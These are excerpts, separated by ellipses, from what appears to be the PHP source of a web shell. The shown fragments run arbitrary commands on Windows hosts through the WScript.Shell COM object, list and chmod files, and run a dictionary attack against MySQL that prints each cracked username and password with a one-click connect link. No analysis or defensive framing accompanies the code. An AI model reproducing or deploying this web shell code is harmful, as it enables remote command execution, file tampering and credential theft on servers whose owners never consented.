...
function hlinK($str=""){
$myvars=array('modE','chmoD','workingdiR','urL','imagE','namE','filE','downloaD','seC','cP','mV','rN','deL');
...
elseif($windows && is_object($ws=new COM("WScript.Shell"))){$dir=whereistmP();$name=$dir."\\".namE();$ws->Run("cmd.exe /C $command >$name",0,true);$exec=file_get_contents($name);unlink($name);}
return $exec;
}
...
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>$cl1";echo "<a href=\"javascript:chmoD('$fn')\" title=\"Change mode\">";if(is_readable($fn))echo "R";if(is_writeable($fn))echo "W";if(is_executable($fn))echo "X";if(is_uploaded_file($fn))echo "U";echo "</a></td>";
echo "$cl1$size</td>";
echo $cl2.$fileaction;
echo "</tr>";
flusheR();
...
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>${cl1}";echo "<a href=\"javascript:chmoD('$fn')\" title=\"Change mode\">L";if(is_readable($ln))echo "R";if (is_writeable($ln))echo "W";if(is_executable($ln))echo "X";echo "</a></td>";
echo "$cl1$size</td>";
echo $cl2.$linkaction;
echo "</tr>";
flusheR();
...
if($windows){
echo "\n</font><font color=green>Method $i:(COM)</font><font color=blue>\n";
...
if($sql){echo "U: $user P: $pass (<a href=\"".hlinK("seC=mysql&typE=MySQL&serveR=$target&useR=$user&pasS=$pass&querY=SHOW+DATABASES&workingdiR=".getcwd())."\">Connect</a>)<br>";mysql_close($sql);if(!$type)break;}
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
...
if($ch != null)location.href="<?php echo hlinK("seC=fm&workingdiR=".addslashes(getcwd())."&chmoD=");?>"+$file+"&modE="+$ch;
}
</script>
